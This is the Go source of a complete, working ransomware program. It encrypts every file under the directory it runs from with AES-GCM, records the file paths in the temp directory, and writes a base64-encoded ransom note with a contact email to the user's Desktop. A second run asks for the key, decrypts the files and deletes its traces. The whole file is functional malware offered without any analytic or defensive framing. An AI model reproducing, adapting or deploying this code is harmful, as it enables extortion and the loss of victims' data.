package main

import (
	"crypto/aes"
	"crypto/cipher"
	cryptorand "crypto/rand"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	mathrand "math/rand"
	"os"
	"path/filepath"
	"strings"
	"time"
)

var encryptionMarker = []byte("ENCRYPTED")

// note is base64 encoded
var note = "WW91ciBmaWxlcyBoYXZlIGJlZW4gY29tcHJvbWlzZWQhDQpUbyByZXN0b3JlIHRoZW0gY29udGFjdCBtZSBhdCBlbWFpbEBlbWFpbC5jb20uDQpBZnRlciByZWNlaXZpbmcgdGhlIGNvZGUsIHJ1biB0aGUgc2FtZSBleGVjdXRhYmxlIGFnYWluLCBhbmQgcGFzdGUgdGhlIGNvZGUgaW4gaXQuDQoNCllvdXIgZW5jcnlwdGlvbiBjb2RlIGlzOiA="
var pathsTempFilePath = ""

func main() {
	pathsTempDir, err := getTempDir()
	if err != nil {
		log.Fatalln(err.Error())
		panic(err)
	}
	pathsTempFilePath = filepath.Join(pathsTempDir, "paths.txt")

	// check if paths.txt exists
	var encrypt bool
	if _, err := os.Stat(pathsTempFilePath); os.IsNotExist(err) {
		encrypt = true
	} else {
		encrypt = false
	}

	if encrypt {
		runEncryption()
	} else {
		runDecryption()
	}
}

func getTempDir() (string, error) {

	tmpDir := os.TempDir()
	// if tmp dir is empty, use user home dir as a fallback
	if tmpDir == "" {
		userHomeDir, err := os.UserHomeDir()
		if err != nil {
			return "", err
		}
		tmpDir = filepath.Join(userHomeDir, "Documents")
	}

	return tmpDir, nil
}

// _________________ENCRYPTION_________________

func runEncryption() {
	// Encrypt files
	// Get all the files in the same directory as this file
	filePaths, err := getFilePathsEncrypt()
	if err != nil {
		log.Fatalln(err.Error())
	}

	userHomeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalln(err.Error())
	}
	desktopDir := filepath.Join(userHomeDir, "Desktop")

	// Generate encryption key (16, 24, or 32 bytes)
	key, err := generateEncryptionKey(32)
	if err != nil {
		log.Fatalln(err.Error())
	}

	// Encrypt files and write key to file
	encryptedFiles := encryptFiles(filePaths, key)
	if len(encryptedFiles) == 0 {
		fmt.Println("No files E.")
		return
	}

	err = writePathsToTempFile(filePaths)
	if err != nil {
		log.Fatalln(err.Error())
	}
	err = writeRansomNote(desktopDir, note, key)
	if err != nil {
		log.Fatalln(err.Error())
	}
}

// Generate a random encryption key of a given size.
func generateEncryptionKey(size int) ([]byte, error) {
	key := make([]byte, size)
	_, err := io.ReadFull(cryptorand.Reader, key)
	if err != nil {
		return nil, err
	}

	return key, nil
}

func writeRansomNote(path string, note string, key []byte) error {
	fmt.Println("Writing key to file...", path+"\\README.txt")
	encodedKey := base64.StdEncoding.EncodeToString(key)
	decodedNote, err := base64.StdEncoding.DecodeString(note)
	if err != nil {
		return err
	}

	text := string(decodedNote) + encodedKey

	if err = os.WriteFile(path+"\\README.txt", []byte(text), 0777); err != nil {
		return err
	}
	return nil
}

func writePathsToTempFile(paths []string) error {

	file, err := os.Create(pathsTempFilePath)
	if err != nil {
		return err
	}
	defer file.Close()

	// write paths to file line by line
	for _, path := range paths {
		_, err := file.WriteString(path + "\n")
		if err != nil {
			return err
		}
	}

	return nil
}

// Encrypt files using AES-GCM.
// Takes a slice of file paths and a key.
// Returns a slice of encrypted file paths.
func encryptFiles(paths []string, key []byte) []string {
	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalln(err.Error())
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalln(err.Error())
	}

	// Generating random nonce
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(cryptorand.Reader, nonce); err != nil {
		log.Fatalln(err.Error())
	}

	var encryptedFiles []string
	for _, path := range paths {
		// Reading plaintext file
		plainText, err := os.ReadFile(path)
		if err != nil {
			log.Fatalln(err.Error())
		}

		// Check if the file is already encrypted by looking for the marker to avoid encrypting it again
		if len(plainText) > len(encryptionMarker) && string(plainText[:len(encryptionMarker)]) == string(encryptionMarker) {
			fmt.Println("File is already E: ", path)
			continue
		}

		// Encrypting the plaintext file
		cipherText := gcm.Seal(nonce, nonce, plainText, nil)

		// Prepend the encryption marker to the ciphertext
		cipherText = append(encryptionMarker, cipherText...)

		// Writing ciphertext file
		err = os.WriteFile(path, cipherText, 0777)
		if err != nil {
			log.Fatalln(err.Error())
		}
		encryptedFiles = append(encryptedFiles, path)
		fmt.Println("E file: ", path)
	}

	return encryptedFiles
}

// get all the files in the same directory as this file
func getFilePathsEncrypt() ([]string, error) {

	// Get the current directory
	currentDir, err := os.Getwd()
	if err != nil {
		return nil, fmt.Errorf("get current directory err: %v", err.Error())
	}

	// Get the executable path to avoid encrypting the executable
	execPath, err := os.Executable()
	if err != nil {
		log.Fatalln(err.Error())
	}

	// walk through the current directory and append all the file paths to the slice
	var filePaths []string
	err = filepath.Walk(currentDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return fmt.Errorf("walk err: %v", err.Error())
		}
		if !info.IsDir() && path != execPath {
			filePaths = append(filePaths, path)
		}

		return nil
	})

	if err != nil {
		return nil, fmt.Errorf("walk err: %v", err.Error())
	}

	return filePaths, nil
}

// _________________DECRYPTION_________________

func runDecryption() {
	// get key from user input
	fmt.Print("Enter key: ")
	var key string
	fmt.Scanln(&key)

	// decode key from base64
	decodedKey, err := base64.StdEncoding.DecodeString(key)
	if err != nil {
		fmt.Println("Invalid key. Exiting...")
		log.Fatalln(err.Error())
	}
	// Get file paths
	filePaths, err := getFilePathsDecrypt()
	if err != nil {
		fmt.Println("No files to D.")
		log.Fatalln(err.Error())
	}
	// Decrypt files
	decryptedFiles := decryptFiles(filePaths, decodedKey)
	if len(decryptedFiles) == 0 {
		fmt.Println("No files D.")
		return
	} else {
		typingPrint("\nKey was correct... \nRestored files: \n")
		for _, file := range decryptedFiles {
			fmt.Println(file)
		}
	}

	// remove temp paths directory
	err = rmTmpPathsDir()
	if err != nil {
		log.Println(err.Error())
	}

	// get the users desktop directory
	userHomeDir, err := os.UserHomeDir()
	if err != nil {
		log.Fatalln(err.Error())
	}
	// remove README.txt
	desktopDir := filepath.Join(userHomeDir, "Desktop")
	err = os.Remove(desktopDir + "\\README.txt")
	if err != nil {
		log.Println(err.Error())
	}

	fmt.Println("\nPress enter to exit...")
	fmt.Scanln()
}

func decryptFiles(paths []string, key []byte) []string {
	// Creating block of algorithm
	block, err := aes.NewCipher(key)
	if err != nil {
		log.Fatalln(err.Error())
	}

	// Creating GCM mode
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		log.Fatalln(err.Error())
	}

	var decryptedFiles []string
	for _, path := range paths {
		// Reading ciphertext file
		cipherText, err := os.ReadFile(path)
		if err != nil {
			log.Println(err.Error())
		}

		// check for encryption marker
		if len(cipherText) > len(encryptionMarker) && string(cipherText[:len(encryptionMarker)]) == string(encryptionMarker) {
			// remove encryption marker
			cipherText = cipherText[len(encryptionMarker):]
		} else {
			fmt.Println("File is not E: ", path)
			continue
		}

		// Deattached nonce and decrypt
		nonce := cipherText[:gcm.NonceSize()]
		cipherText = cipherText[gcm.NonceSize():]
		plainText, err := gcm.Open(nil, nonce, cipherText, nil)
		if err != nil {
			log.Printf("D file err: %v", err.Error())
			continue
		}

		// Writing decryption content
		err = os.WriteFile(path, plainText, 0777)
		if err != nil {
			log.Printf("write file err: %v", err.Error())
		}
		decryptedFiles = append(decryptedFiles, path)
	}
	return decryptedFiles
}

func rmTmpPathsDir() error {
	err := os.RemoveAll(pathsTempFilePath)
	if err != nil {
		return err
	}
	return nil
}

// Gets file paths from paths.txt which is located in the tmp directory or users documents directory
func getFilePathsDecrypt() ([]string, error) {
	// check if paths.txt exists in tmp directory
	if _, err := os.Stat(pathsTempFilePath); os.IsNotExist(err) {
		return nil, fmt.Errorf("paths.txt does not exist")
	}

	// read file
	file, err := os.ReadFile(pathsTempFilePath)
	if err != nil {
		return nil, err
	}

	// split file by new line
	paths := strings.Split(string(file), "\n")
	// remove trailing empty string
	if paths[len(paths)-1] == "" {
		paths = paths[:len(paths)-1]
	}

	return paths, nil
}

// print text with a typing effect
func typingPrint(text string) {
	for i := 0; i < len(text); i++ {
		fmt.Print(text[i : i+1])
		// sleep
		// generate random number between 30 and 200
		randNum := time.Duration(20 + mathrand.Intn(60))
		time.Sleep(randNum * time.Millisecond)
	}
}
